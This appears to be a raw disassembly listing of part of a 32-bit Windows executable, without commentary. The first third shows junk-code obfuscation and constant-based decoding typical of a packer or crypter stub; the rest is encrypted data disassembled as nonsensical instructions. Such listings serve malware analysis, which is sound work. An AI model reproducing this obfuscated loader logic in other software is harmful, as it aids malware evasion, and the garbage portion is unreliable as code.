  40c843:	mov    DWORD PTR [ebp-0xc],esi
  40c846:	mov    eax,DWORD PTR [ebp-0xc]
  40c849:	sbb    DWORD PTR ds:0x42b008,0x2a28
  40c853:	mov    esi,DWORD PTR [ebp+0xc]
  40c856:	sub    DWORD PTR ds:0x42b010,0xd18
  40c860:	xor    eax,ecx
  40c862:	lea    eax,[eax*8+0x1939778]
  40c869:	add    DWORD PTR ds:0x42c00c,0x2208
  40c873:	mov    eax,DWORD PTR [esi+eax*1]
  40c876:	mov    DWORD PTR [ebp+0xc],eax
  40c879:	not    esi
  40c87b:	mov    eax,DWORD PTR [ebp-0x4]
  40c87e:	mov    esi,DWORD PTR [ebp-0x8]
  40c881:	or     DWORD PTR ds:0x42d008,0x42c01c
  40c88b:	xor    eax,ecx
  40c88d:	xor    esi,ecx
  40c88f:	sbb    DWORD PTR ds:0x42a008,0x42d00c
  40c899:	add    esi,edx
  40c89b:	add    eax,edx
  40c89d:	imul   eax,esi
  40c8a0:	mov    esi,DWORD PTR [ebp+0xc]
  40c8a3:	cmp    esi,eax
  40c8a5:	je     0x40c8c6
  40c8ab:	mov    eax,DWORD PTR [ebp-0x4]
  40c8ae:	xor    eax,ecx
  40c8b0:	mov    ecx,DWORD PTR [ebp+0xc]
  40c8b3:	add    eax,edx
  40c8b5:	imul   eax,ecx
  40c8b8:	add    eax,DWORD PTR [ebp+0x8]
  40c8bb:	mov    DWORD PTR [ebp+0xc],eax
  40c8be:	mov    eax,DWORD PTR [ebp+0xc]
  40c8c1:	jmp    0x40c8d7
  40c8c6:	mov    eax,DWORD PTR [ebp-0x4]
  40c8c9:	mov    esi,DWORD PTR [ebp-0x8]
  40c8cc:	xor    esi,ecx
  40c8ce:	xor    eax,ecx
  40c8d0:	add    esi,edx
  40c8d2:	add    eax,edx
  40c8d4:	imul   eax,esi
  40c8d7:	pop    edi
  40c8d8:	pop    esi
  40c8d9:	leave  
  40c8da:	ret    0x8
  40c8dd:	push   ebp
  40c8de:	mov    ebp,esp
  40c8e0:	push   ecx
  40c8e1:	add    edx,edx
  40c8e3:	mov    DWORD PTR [ebp-0x4],0xf89c85bd
  40c8ea:	adc    ecx,eax
  40c8ec:	mov    eax,DWORD PTR [ebp-0x4]
  40c8ef:	mov    edx,DWORD PTR [ebp+0x10]
  40c8f2:	mov    DWORD PTR ds:0x42b000,0x1c
  40c8fc:	cmp    DWORD PTR ds:0x42b000,0x0
  40c903:	je     0x40c957
  40c909:	cmp    DWORD PTR ds:0x42b000,0x8
  40c910:	jne    0x40c921
  40c916:	push   0x42c000
  40c91b:	call   DWORD PTR ds:0x42e9d3
  40c921:	cmp    DWORD PTR ds:0x42b000,0x9
  40c928:	jne    0x40c93b
  40c92e:	mov    ecx,DWORD PTR ds:0x42b000
  40c934:	dec    ecx
  40c935:	mov    DWORD PTR ds:0x42b000,ecx
  40c93b:	mov    ecx,DWORD PTR ds:0x42b000
  40c941:	dec    ecx
  40c942:	mov    DWORD PTR ds:0x42b000,ecx
  40c948:	jmp    0x40c8fc
  40c94d:	and    DWORD PTR ds:0x42c000,0x7708
  40c957:	mov    ecx,0x7510899
  40c95c:	xor    eax,ecx
  40c95e:	xor    DWORD PTR ds:0x42a018,0x429008
  40c968:	add    eax,0x3272e0
  40c96d:	mov    DWORD PTR [edx],eax
  40c96f:	mov    DWORD PTR ds:0x429018,0x10
  40c979:	cmp    DWORD PTR ds:0x429018,0x0
  40c980:	je     0x40c9d0
  40c986:	cmp    DWORD PTR ds:0x429018,0x4
  40c98d:	jne    0x40c9a8
  40c993:	push   0x42b008
  40c998:	push   0x429024
  40c99d:	push   0x42d000
  40c9a2:	call   DWORD PTR ds:0x42e993
  40c9a8:	cmp    DWORD PTR ds:0x429018,0x5
  40c9af:	jne    0x40c9c0
  40c9b5:	mov    eax,ds:0x429018
  40c9ba:	dec    eax
  40c9bb:	mov    ds:0x429018,eax
  40c9c0:	mov    eax,ds:0x429018
  40c9c5:	dec    eax
  40c9c6:	mov    ds:0x429018,eax
  40c9cb:	jmp    0x40c979
  40c9d0:	mov    eax,DWORD PTR [ebp+0xc]
  40c9d3:	xor    eax,ecx
  40c9d5:	push   esi
  40c9d6:	mov    esi,DWORD PTR [ebp+0x10]
  40c9d9:	mov    edx,0x3272e0
  40c9de:	add    eax,edx
  40c9e0:	mov    DWORD PTR [esi+0x4],eax
  40c9e3:	mov    eax,DWORD PTR [ebp+0x14]
  40c9e6:	mov    esi,DWORD PTR [ebp+0x10]
  40c9e9:	mov    DWORD PTR [esi+0x8],eax
  40c9ec:	mov    eax,DWORD PTR [ebp+0x18]
  40c9ef:	mov    esi,DWORD PTR [ebp+0x10]
  40c9f2:	mov    DWORD PTR [esi+0xc],eax
  40c9f5:	mov    eax,DWORD PTR [ebp+0x1c]
  40c9f8:	mov    esi,DWORD PTR [ebp+0x10]
  40c9fb:	mov    DWORD PTR [esi+0x10],eax
  40c9fe:	mov    eax,DWORD PTR [ebp+0x8]
  40ca01:	xor    eax,ecx
  40ca03:	add    eax,edx
  40ca05:	pop    esi
  40ca06:	leave  
  40ca07:	ret    0x18
  40ca0a:	push   ebp
  40ca0b:	mov    ebp,esp
  40ca0d:	sub    esp,0x9c
  40ca13:	mov    ecx,DWORD PTR [ebp+0x8]
  40ca16:	mov    DWORD PTR ds:0x429004,0x1d
  40ca20:	cmp    DWORD PTR ds:0x429004,0x0
  40ca27:	je     0x40cae1
  40ca2d:	cmp    DWORD PTR ds:0x429004,0x2
  40ca34:	jne    0x40ca4b
  40ca3a:	push   DWORD PTR [ebp-0x10]
  40ca3d:	push   DWORD PTR [ebp-0x24]
  40ca40:	push   0x1cdf
  40ca45:	call   DWORD PTR ds:0x42e997
  40ca4b:	cmp    DWORD PTR ds:0x429004,0x3
  40ca52:	jne    0x40ca66
  40ca58:	xor    eax,eax
  40ca5a:	add    eax,DWORD PTR ds:0x429004
  40ca60:	dec    eax
  40ca61:	mov    ds:0x429004,eax
  40ca66:	xor    eax,eax
  40ca68:	add    eax,DWORD PTR ds:0x429004
  40ca6e:	dec    eax
  40ca6f:	mov    ds:0x429004,eax
  40ca74:	jmp    0x40ca20
  40ca79:	and    DWORD PTR ds:0x42b00c,0x0
  40ca83:	mov    eax,ds:0x42b00c
  40ca88:	inc    eax
  40ca89:	mov    ds:0x42b00c,eax
  40ca8e:	cmp    DWORD PTR ds:0x42b00c,0x6
  40ca95:	jne    0x40cabc
  40ca9b:	push   DWORD PTR [ebp-0x28]
  40ca9e:	push   DWORD PTR [ebp-0xc]
  40caa1:	push   0x42b000
  40caa6:	push   DWORD PTR [ebp-0x20]
  40caa9:	push   0x567e
  40caae:	push   0x641c
  40cab3:	push   DWORD PTR [ebp-0x24]
  40cab6:	call   DWORD PTR ds:0x42e99f
  40cabc:	cmp    DWORD PTR ds:0x42b00c,0x5
  40cac3:	jne    0x40cad4
  40cac9:	mov    eax,ds:0x42b00c
  40cace:	inc    eax
  40cacf:	mov    ds:0x42b00c,eax
  40cad4:	cmp    DWORD PTR ds:0x42b00c,0x15
  40cadb:	jb     0x40ca83
  40cae1:	mov    eax,0x8a8c
  40cae6:	xor    ax,WORD PTR [ecx+0x20]
  40caea:	and    DWORD PTR ds:0x42c008,0x0
  40caf4:	jmp    0x40cb08
  40caf9:	xor    ecx,ecx
  40cafb:	or     ecx,DWORD PTR ds:0x42c008
  40cb01:	inc    ecx
  40cb02:	mov    DWORD PTR ds:0x42c008,ecx
  40cb08:	cmp    DWORD PTR ds:0x42c008,0x14
  40cb0f:	jae    0x40cb9f
  40cb15:	cmp    DWORD PTR ds:0x42c008,0x18
  40cb1c:	jne    0x40cb3d
  40cb22:	push   0x42d00c
  40cb27:	push   DWORD PTR [ebp-0x24]
  40cb2a:	push   0x42e0d9
  40cb2f:	push   0x627f
  40cb34:	push   DWORD PTR [ebp-0x1c]
  40cb37:	call   DWORD PTR ds:0x42e9a3
  40cb3d:	jmp    0x40caf9
  40cb42:	mov    DWORD PTR ds:0x42c010,0x15
  40cb4c:	cmp    DWORD PTR ds:0x42c010,0x0
  40cb53:	je     0x40cb9f
  40cb59:	cmp    DWORD PTR ds:0x42c010,0xa
  40cb60:	jne    0x40cb71
  40cb66:	push   0x42a000
  40cb6b:	call   DWORD PTR ds:0x42e9ab
  40cb71:	cmp    DWORD PTR ds:0x42c010,0xb
  40cb78:	jne    0x40cb8d
  40cb7e:	xor    ecx,ecx
  40cb80:	xor    ecx,DWORD PTR ds:0x42c010
  40cb86:	dec    ecx
  40cb87:	mov    DWORD PTR ds:0x42c010,ecx
  40cb8d:	mov    ecx,DWORD PTR ds:0x42c010
  40cb93:	dec    ecx
  40cb94:	mov    DWORD PTR ds:0x42c010,ecx
  40cb9a:	jmp    0x40cb4c
  40cb9f:	mov    ecx,0x3b50
  40cba4:	sub    DWORD PTR ds:0x42900c,0x429000
  40cbae:	add    ax,cx
  40cbb1:	movzx  eax,ax
  40cbb4:	mov    DWORD PTR ds:0x42b000,0x10
  40cbbe:	cmp    DWORD PTR ds:0x42b000,0x0
  40cbc5:	je     0x40cc00
  40cbcb:	cmp    DWORD PTR ds:0x42b000,0x17
  40cbd2:	jne    0x40cbee
  40cbd8:	push   0x898b
  40cbdd:	push   DWORD PTR [ebp-0x10]
  40cbe0:	push   0x429018
  40cbe5:	push   DWORD PTR [ebp-0xc]
  40cbe8:	call   DWORD PTR ds:0x42e9af
  40cbee:	mov    ecx,DWORD PTR ds:0x42b000
  40cbf4:	dec    ecx
  40cbf5:	mov    DWORD PTR ds:0x42b000,ecx
  40cbfb:	jmp    0x40cbbe
  40cc00:	mov    DWORD PTR [ebp-0x10],eax
  40cc03:	movzx  ecx,BYTE PTR ds:0x42d010
  40cc0a:	or     ecx,DWORD PTR ds:0x42a014
  40cc10:	mov    DWORD PTR ds:0x42d010,ecx
  40cc16:	mov    BYTE PTR [ebp-0x1],0x79
  40cc1a:	lea    eax,[ebp-0x1]
  40cc1d:	and    ecx,DWORD PTR ds:0x42b014
  40cc23:	mov    DWORD PTR [ebp-0xc],eax
  40cc26:	xor    DWORD PTR ds:0x42a00c,edx
  40cc2c:	jmp    0x40efb2
  40cc31:	mov    esp,0xfb9ef6c5
  40cc36:	lea    edx,[ebx+ecx*8+0x3e7be512]
  40cc3d:	cdq    
  40cc3e:	mov    esi,0xe5f8de7a
  40cc43:	jp     0x40ccbf
  40cc45:	add    DWORD PTR [edi+0x7a],ebx
  40cc48:	jp     0x40cbf9
  40cc4a:	xor    al,0xf9
  40cc4c:	lock ror ecx,0x35
  40cc50:	lea    edi,[edi+0x2]
  40cc53:	aaa    
  40cc54:	rcr    DWORD PTR [esi-0x76ba44a3],1
  40cc5a:	lahf   
  40cc5b:	push   ds
  40cc5c:	iret   
  40cc5d:	cli    
  40cc5e:	cmp    edi,DWORD PTR [edx+0x20]
  40cc61:	dec    esi
  40cc62:	mov    esi,DWORD PTR ds:0xa0446fd6
  40cc68:	shl    ch,0xb5
  40cc6b:	jnp    0x40cc5e
  40cc6d:	les    esp,FWORD PTR [ecx+0x2559adae]
  40cc73:	mov    al,0x5b
  40cc75:	rol    eax,cl
  40cc77:	adc    al,0x43
  40cc79:	xchg   ebx,eax
  40cc7a:	fsubrp st(7),st
  40cc7c:	into   
  40cc7d:	ss clc 
  40cc7f:	outs   dx,DWORD PTR ds:[esi]
  40cc80:	adc    eax,0x812338e3
  40cc85:	cmp    dh,BYTE PTR [eax-0x4465f80f]
  40cc8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cc8c:	xchg   ebx,eax
  40cc8d:	prefetchw BYTE PTR [ebp+0x15]
  40cc91:	pop    ebx
  40cc92:	and    eax,0xafc5e7a5
  40cc97:	push   esp
  40cc98:	jns    0x40cc24
  40cc9a:	pop    esi
  40cc9b:	inc    ebx
  40cc9c:	arpl   WORD PTR [eax],cx
  40cc9e:	sub    eax,0xc2151b32
  40cca3:	add    BYTE PTR [edi-0x2f],cl
  40cca6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cca7:	les    eax,FWORD PTR [esi-0x7d]
  40ccaa:	test   eax,0xd59eeb8b
  40ccaf:	and    DWORD PTR [ecx+edx*1-0xa],ecx
  40ccb3:	jb     0x40cc9a
  40ccb5:	mov    al,ch
  40ccb7:	test   BYTE PTR [ecx+esi*8+0x2a08e6c2],ch
  40ccbe:	xchg   esp,eax
  40ccbf:	mov    eax,ds:0xe69b57fe
  40ccc4:	dec    ebp
  40ccc5:	jl     0x40cd1f
  40ccc7:	nop
  40ccc8:	cdq    
  40ccc9:	sbb    dh,BYTE PTR [ecx]
  40cccb:	int3   
  40cccc:	in     eax,0x99
  40ccce:	dec    edi
  40cccf:	push   ebx
  40ccd0:	jle    0x40cc62
  40ccd2:	pop    ebx
  40ccd3:	jae    0x40cd41
  40ccd5:	pushf  
  40ccd6:	mov    bl,0x97
  40ccd8:	jle    0x40ccc2
  40ccda:	daa    
  40ccdb:	push   ds
  40ccdc:	cmp    DWORD PTR [esi-0x462359e4],0x3e
  40cce3:	mov    BYTE PTR cs:[edi],bl
  40cce6:	(bad)  [edi+eax*1-0x63713fbc]
  40cced:	ds jno 0x40ccda
  40ccf0:	xchg   edi,eax
  40ccf1:	mov    eax,0x2846b56b
  40ccf6:	pusha  
  40ccf7:	(bad)  
  40ccf8:	add    dl,dl
  40ccfa:	(bad)  
  40ccfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ccfc:	jle    0x40ccec
  40ccfe:	inc    BYTE PTR [edx-0x32]
  40cd01:	jno    0x40cce1
  40cd03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd04:	retf   
  40cd05:	mov    esp,0x1a13b484
  40cd0a:	dec    esi
  40cd0b:	loope  0x40cd4f
  40cd0d:	push   cs
  40cd0e:	test   BYTE PTR [edx+0xd],bh
  40cd11:	jp     0x40cd65
  40cd13:	ds data16 sti 
  40cd16:	rep ins DWORD PTR es:[edi],dx
  40cd18:	pop    edx
  40cd19:	inc    ebp
  40cd1a:	xlat   BYTE PTR ds:[ebx]
  40cd1b:	cld    
  40cd1c:	dec    eax
  40cd1d:	arpl   WORD PTR [ebp+0x4],di
  40cd20:	push   es
  40cd21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cd22:	dec    ecx
  40cd23:	addr16 js 0x40cd1e
  40cd26:	ss push ecx
  40cd28:	and    al,0xc6
  40cd2a:	and    edx,ebp
  40cd2c:	or     al,0x2b
  40cd2e:	fisub  WORD PTR [esi+0x2d81da3c]
  40cd34:	jbe    0x40cce1
  40cd36:	stos   BYTE PTR es:[edi],al
  40cd37:	stc    
  40cd38:	into   
  40cd39:	xchg   edi,eax
  40cd3a:	sbb    DWORD PTR [ecx+0x9],0x8d0a54ac
  40cd41:	(bad)  
  40cd43:	and    dl,al
  40cd45:	inc    esi
  40cd46:	dec    ecx
  40cd47:	shl    dh,0x56
  40cd4a:	sub    eax,0x973a9802
  40cd4f:	cs mov ch,0x6e
  40cd52:	inc    ebx
  40cd53:	mov    bh,0x94
  40cd55:	fld    QWORD PTR [edx+eax*1]
  40cd58:	pop    eax
  40cd59:	and    al,0x86
  40cd5b:	cmp    edx,DWORD PTR [ebx+0x21b6a924]
  40cd61:	(bad)  
  40cd62:	stc    
  40cd63:	mov    dh,0xfd
  40cd65:	addr16 pop es
  40cd67:	in     eax,0x9d
  40cd69:	jle    0x40cd47
  40cd6b:	aas    
  40cd6c:	adc    al,0x81
  40cd6e:	push   ecx
  40cd6f:	dec    ecx
  40cd70:	imul   eax,DWORD PTR [eax-0x60],0xb219be46
  40cd77:	mov    ecx,0x3c8b9e17
  40cd7c:	cmp    bl,BYTE PTR [esi-0x26]
  40cd7f:	sahf   
  40cd80:	popa   
  40cd81:	jno    0x40cd7b
  40cd83:	es cdq 
  40cd85:	leave  
  40cd86:	shr    DWORD PTR [ecx*8+0xa8bd589],0xa1
  40cd8e:	xchg   edx,eax
  40cd8f:	pop    ds
  40cd90:	icebp  
  40cd91:	adc    al,0x65
  40cd93:	pusha  
  40cd94:	retf   
  40cd95:	iretw  
  40cd97:	cmp    eax,0xbef6e5a7
  40cd9c:	mov    BYTE PTR [ebx+0x2011ff21],al
  40cda2:	cmp    dh,BYTE PTR ds:0x20e642b6
  40cda8:	ret    0x2ad2
  40cdab:	(bad)  
  40cdac:	xlat   BYTE PTR ds:[ebx]
  40cdad:	cli    
  40cdae:	in     al,0x69
  40cdb0:	jmp    0xf8a5:0x106f3b3f
  40cdb7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cdb8:	retf   0x1a9e
  40cdbb:	pop    es
  40cdbc:	daa    
  40cdbd:	jge    0x40cdd5
  40cdbf:	and    eax,0x3c54b2f
  40cdc4:	mov    ds:0x6906b4a0,al
  40cdc9:	sbb    BYTE PTR [ebx+0x5a16385b],dl
  40cdcf:	dec    ebx
  40cdd0:	mov    eax,ds:0x6f54a5c
  40cdd5:	xchg   bx,ax
  40cdd7:	dec    ebp
  40cdd8:	cmp    al,0x9b
  40cdda:	cmp    al,0x29
  40cddc:	mov    eax,ds:0x1c1dfeab
  40cde1:	and    BYTE PTR [ebx-0x3c0a32d1],ah
  40cde7:	push   edx
  40cde8:	dec    edx
  40cde9:	daa    
  40cdea:	add    bh,BYTE PTR [ebp-0x77]
  40cded:	ins    BYTE PTR es:[edi],dx
  40cdee:	ret    0x3d30
  40cdf1:	mov    ds:0xd11b4d47,eax
  40cdf6:	call   0x4c6b:0xaf6a39b6
  40cdfd:	dec    ebx
  40cdfe:	xor    eax,0x986ec63c
  40ce03:	mov    ebp,0x121a8f6e
  40ce08:	stos   BYTE PTR es:[edi],al
  40ce09:	dec    ebp
  40ce0a:	jecxz  0x40ce28
  40ce0c:	xor    ebp,0xe996a9bd
  40ce12:	arpl   WORD PTR [eax+ebp*8+0xdfeca95],ax
  40ce19:	or     eax,edx
  40ce1b:	mov    esi,0x9a2d151f
  40ce20:	push   ecx
  40ce21:	shl    BYTE PTR [eax],cl
  40ce23:	shl    BYTE PTR [ebx],0xd0
  40ce26:	cmp    ah,ch
  40ce28:	nop
  40ce29:	or     eax,0xe6543d6e
  40ce2e:	pop    ebp
  40ce2f:	test   BYTE PTR [eax+0x4f],ch
  40ce32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ce33:	xlat   BYTE PTR ds:[ebx]
  40ce34:	cli    
  40ce35:	and    bh,BYTE PTR [ecx+0x99467d0]
  40ce3b:	shl    BYTE PTR [ecx-0x69],1
  40ce3e:	gs mov dl,0xe7
  40ce41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce42:	test   DWORD PTR [ebp+0x53a3b8cf],0x70d58ee8
  40ce4c:	push   ebx
  40ce4d:	out    dx,eax
  40ce4e:	mov    BYTE PTR [ebx-0x62],ch
  40ce51:	cmp    ah,BYTE PTR [edi-0x70a81232]
  40ce57:	inc    ebx
  40ce58:	test   cl,bh
  40ce5a:	sub    eax,0xfbf550e6
  40ce5f:	add    ah,0xab
  40ce62:	clc    
  40ce63:	cdq    
  40ce64:	and    eax,0x374528ff
  40ce69:	mov    dl,0xbb
  40ce6b:	arpl   WORD PTR [eax+0x3fafff6e],cx
  40ce71:	push   0x6a876766
  40ce76:	aas    
  40ce77:	add    eax,0xb28a16d4
  40ce7c:	push   edx
  40ce7d:	add    esi,DWORD PTR [edi+0x703f18e1]
  40ce83:	pop    ebx
  40ce84:	inc    edx
  40ce85:	mov    eax,ds:0x4cf7dce0
  40ce8a:	jmp    0xec3e:0xb73b6159
  40ce91:	js     0x40ce40
  40ce93:	dec    edx
  40ce94:	mov    dl,0xc0
  40ce96:	sbb    DWORD PTR [ecx+0x9],ebp
  40ce99:	ret    0x7c27
  40ce9c:	scas   eax,DWORD PTR es:[edi]
  40ce9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce9e:	popa   
  40ce9f:	je     0x40ce83
  40cea1:	in     al,dx
  40cea2:	push   edx
  40cea3:	and    cl,0x17
  40cea6:	sub    BYTE PTR [ebx-0x24cdf111],bl
  40ceac:	imul   ax,WORD PTR [ebx+0x17be69bb],0x9c05
  40ceb5:	sub    DWORD PTR [ecx],ecx
  40ceb7:	ins    BYTE PTR es:[edi],dx
  40ceb8:	test   DWORD PTR [ebp-0x5e],ecx
  40cebb:	(bad)  
  40cebd:	fcmovbe st,st(3)
  40cebf:	mov    ebp,0xf3df473f
  40cec4:	retf   0x3afa
  40cec7:	adc    ch,BYTE PTR [ebx+0x124682e2]
  40cecd:	xchg   edx,eax
  40cece:	xchg   ebx,eax
  40cecf:	pop    ss
  40ced0:	dec    esi
  40ced1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ced2:	xchg   edi,eax
  40ced3:	dec    ebx
  40ced4:	(bad)  
  40ced5:	ret    
  40ced6:	ret    0x2f17
  40ced9:	mov    dh,0xd4
  40cedb:	fnstenv [edi+0x2019fdc]
  40cee1:	arpl   WORD PTR [edi],bp
  40cee3:	adc    esp,DWORD PTR [edx-0x6e43db22]
  40cee9:	fild   WORD PTR ds:0xe995c7ac
  40ceef:	adc    eax,0xabdf36f6
  40cef4:	ret    0x7a67
  40cef7:	xchg   esp,eax
  40cef8:	dec    edi
  40cef9:	xchg   ebp,eax
  40cefa:	in     eax,0x65
  40cefc:	adc    BYTE PTR [ecx-0x73],ch
  40ceff:	mov    cl,0x78
  40cf01:	or     BYTE PTR [ecx+esi*4+0x6dcda229],ch
  40cf08:	sub    DWORD PTR [edx+0x6a],edx
  40cf0b:	(bad)  
  40cf0c:	cmp    al,BYTE PTR [edx-0x3bd812e1]
  40cf12:	pop    edx
  40cf13:	jmp    0x2b868172
  40cf18:	mov    ?,WORD PTR [esi-0x683e1da6]
  40cf1e:	repz pop ss
  40cf20:	jl     0x40cecf
  40cf22:	mov    edx,0x9ad1de27
  40cf27:	js     0x40cef1
  40cf29:	call   0x7fa8:0x6efdd37b
  40cf30:	pop    ecx
  40cf31:	jnp    0x40cf4f
  40cf33:	int3   
  40cf34:	sub    eax,0xd59c44f4
  40cf39:	loope  0x40cfad
  40cf3b:	jmp    0xd56c4e5a
  40cf40:	sbb    ebx,ecx
  40cf42:	push   ss
  40cf43:	lods   al,BYTE PTR ds:[esi]
  40cf44:	test   edx,ecx
  40cf46:	mov    bl,BYTE PTR [ebx]
  40cf48:	dec    esi
  40cf49:	xchg   esp,eax
  40cf4a:	add    cl,BYTE PTR ds:0x84f06fb6
  40cf50:	daa    
  40cf51:	adc    ebx,edi
  40cf53:	inc    ebx
  40cf54:	dec    esp
  40cf55:	nop
  40cf56:	add    al,BYTE PTR [edi-0x5b]
  40cf59:	adc    ch,BYTE PTR [edx+0x5]
  40cf5c:	lahf   
  40cf5d:	fsubr  DWORD PTR [esi+0x15]
  40cf60:	punpcklwd mm5,DWORD PTR ds:0xa20a4d1e
  40cf67:	mov    ds:0xc8982933,al
  40cf6c:	ds inc esp
  40cf6e:	pusha  
  40cf6f:	jge    0x40cf35
  40cf71:	sub    edi,DWORD PTR [edx-0x2242092d]
  40cf77:	retf   0xe0f3
  40cf7a:	iret   
  40cf7b:	pop    esi
  40cf7c:	xchg   edi,eax
  40cf7d:	jno    0x40cf77
  40cf7f:	ficom  DWORD PTR [esi-0x437c1b65]
  40cf85:	icebp  
  40cf86:	jmp    0x40cf63
  40cf88:	push   ebp
  40cf89:	fwait
  40cf8a:	adc    eax,ebx
  40cf8c:	xor    BYTE PTR [ebx],bl
  40cf8e:	mov    WORD PTR [esi+0x7a],es
  40cf91:	adc    DWORD PTR [ecx-0x33],edi
  40cf94:	adc    edi,edi
  40cf96:	jge    0x40cf70
  40cf98:	push   esp
  40cf99:	sbb    dh,BYTE PTR [esi+0x27]
  40cf9c:	mov    ah,0xef
  40cf9e:	and    ch,ch
  40cfa0:	loopne 0x40d015
  40cfa2:	call   0x7866e0a0
  40cfa7:	loopne 0x40cf6b
  40cfa9:	imul   esp,DWORD PTR [esi],0xffffffd7
  40cfac:	or     al,0x92
  40cfae:	stos   BYTE PTR es:[edi],al
  40cfaf:	cmp    eax,0xc70fb22a
  40cfb4:	cmp    al,0x1a
  40cfb6:	mov    esi,0x13262c9c
  40cfbb:	mul    BYTE PTR cs:[ecx+0x4f]
  40cfbf:	jae    0x40cf82
  40cfc1:	or     al,0x8
  40cfc3:	or     eax,0x7d86ff66
  40cfc8:	mov    al,ds:0xae22d859
  40cfcd:	mov    ebp,0xb1f819aa
  40cfd2:	jge    0x40cf66
  40cfd4:	xchg   ebx,eax
  40cfd5:	sub    ecx,ebx
  40cfd7:	xchg   ebp,eax
  40cfd8:	mov    ecx,0xd19c6219
  40cfdd:	xor    BYTE PTR [ebp*8+0x76bc4732],bl
  40cfe4:	and    al,0x63
  40cfe6:	fadd   DWORD PTR ds:0xa53fe7fa
  40cfec:	jne    0x40d047
  40cfee:	push   0x72b0c52d
  40cff3:	add    bh,BYTE PTR [ecx-0x406e72c8]
  40cff9:	rep ins BYTE PTR es:[edi],dx
  40cffb:	dec    esp
  40cffc:	xor    cl,bl
  40cffe:	fnsave [ebp-0x58]
  40d001:	out    dx,al
  40d002:	(bad)  
  40d003:	rol    BYTE PTR [edx+0x6e],1
  40d006:	lock imul ebp,ebp,0x81bb56da
  40d00d:	dec    edi
  40d00e:	(bad)  
  40d00f:	ror    DWORD PTR ss:[ebp-0x2e7e3c4f],cl
  40d016:	and    DWORD PTR [esi+0x11],ebp
  40d019:	in     eax,dx
  40d01a:	(bad)  
  40d01b:	sbb    ch,BYTE PTR [ebp-0x48eb4ff4]
  40d021:	fstp   QWORD PTR [edx+ebx*4-0x24]
  40d025:	xchg   BYTE PTR [edx-0x20f4239c],bl
  40d02b:	xlat   BYTE PTR ds:[ebx]
  40d02c:	jns    0x40d000
  40d02e:	cmp    al,0x77
  40d030:	(bad)  
  40d032:	add    ecx,DWORD PTR [ebp+ebx*2-0xaf8d848]
  40d039:	repz in eax,0xf2
  40d03c:	adc    ebp,ecx
  40d03e:	int3   
  40d03f:	mov    bl,BYTE PTR [esi]
  40d041:	mov    dl,BYTE PTR [eax-0x7cc8e0b6]
  40d047:	scas   eax,DWORD PTR es:[edi]
  40d048:	add    eax,0x6a472b08
  40d04d:	jg     0x40d089
  40d04f:	or     ebp,DWORD PTR [ebx-0xd]
  40d052:	push   edi
  40d053:	inc    edx
  40d054:	enter  0xf392,0x11
  40d058:	aaa    
  40d059:	cmp    al,0xf3
  40d05b:	retf   0x9055
  40d05e:	setge  BYTE PTR [ebp+0x58406879]
  40d065:	sbb    bl,BYTE PTR [edi+edi*1]
  40d068:	test   dh,ah
  40d06a:	shl    DWORD PTR es:[edx+edi*8-0x4d],1
  40d06f:	add    al,0x9f
  40d071:	repnz loopne 0x40d03f
  40d074:	dec    ecx
  40d075:	adc    dh,BYTE PTR [edx+0x776fbfc]
  40d07b:	dec    ebp
  40d07c:	cmp    cl,BYTE PTR [edi+0x76e07e52]
  40d082:	jl     0x40d0fc
  40d084:	mov    ah,0x31
  40d086:	mov    edx,0xe06bae52
  40d08b:	xchg   esi,eax
  40d08c:	xchg   edx,eax
  40d08d:	jne    0x40d0cf
  40d08f:	xchg   esp,eax
  40d090:	rol    BYTE PTR [edx+0x65],cl
  40d093:	mov    bh,0xf
  40d095:	out    0x20,al
  40d097:	xor    DWORD PTR [ebx+0x1d],eax
  40d09a:	sbb    BYTE PTR [edx+0x11e7c00],0xc3
  40d0a1:	sti    
  40d0a2:	push   0x32633e6
  40d0a7:	mov    ecx,ebp
  40d0a9:	jp     0x40d02e
  40d0ab:	xor    eax,0xcb2ef83a
  40d0b0:	inc    eax
  40d0b1:	stos   BYTE PTR es:[edi],al
  40d0b2:	pop    es
  40d0b3:	adc    al,0x9d
  40d0b5:	or     DWORD PTR [esi+0x7f6af666],eax
  40d0bb:	outs   dx,BYTE PTR ds:[esi]
  40d0bc:	cmp    ecx,DWORD PTR [eax-0x2361a570]
  40d0c2:	popf   
  40d0c3:	pop    ss
  40d0c4:	pusha  
  40d0c5:	or     BYTE PTR [esi+0x7c4f46c2],ch
  40d0cb:	or     ebx,eax
  40d0cd:	jle    0x40d09b
  40d0cf:	shl    DWORD PTR [edx+0x9292cc3],1
  40d0d5:	int3   
  40d0d6:	repnz adc eax,0x18c2a115
  40d0dc:	or     al,0x2
  40d0de:	in     eax,dx
  40d0df:	sub    ebp,DWORD PTR [ebp-0x44]
  40d0e2:	stos   DWORD PTR es:[edi],eax
  40d0e3:	pop    ss
  40d0e4:	xor    BYTE PTR [ecx],0xb9
  40d0e7:	jl     0x40d121
  40d0e9:	mov    ebp,0x957efcc1
  40d0ee:	cmp    al,0xd3
  40d0f0:	or     al,0x14
  40d0f2:	jmp    0x8383:0x2971ca08
  40d0f9:	fs pop esi
  40d0fb:	fwait
  40d0fc:	popf   
  40d0fd:	pop    ebx
  40d0fe:	enter  0xb14e,0xbc
  40d102:	aam    0xaf
  40d104:	pop    esp
  40d105:	push   ax
  40d107:	xchg   ecx,eax
  40d108:	inc    eax
  40d109:	int    0x52
  40d10b:	js     0x40d0f2
  40d10d:	aaa    
  40d10e:	inc    BYTE PTR [ebp-0x5]
  40d111:	ins    DWORD PTR es:[edi],dx
  40d112:	daa    
  40d113:	mov    bl,0x37
  40d115:	cwde   
  40d116:	and    DWORD PTR [ebp+0x31],ecx
  40d119:	call   0x760d0ba3
  40d11e:	adc    edi,DWORD PTR [ecx]
  40d120:	or     DWORD PTR [eax+0x69],ecx
  40d123:	inc    ebp
  40d124:	fsub   QWORD PTR [edx+edx*1-0x3d]
  40d128:	sbb    edx,esp
  40d12a:	fadd   DWORD PTR [edx]
  40d12c:	cmp    al,0xfe
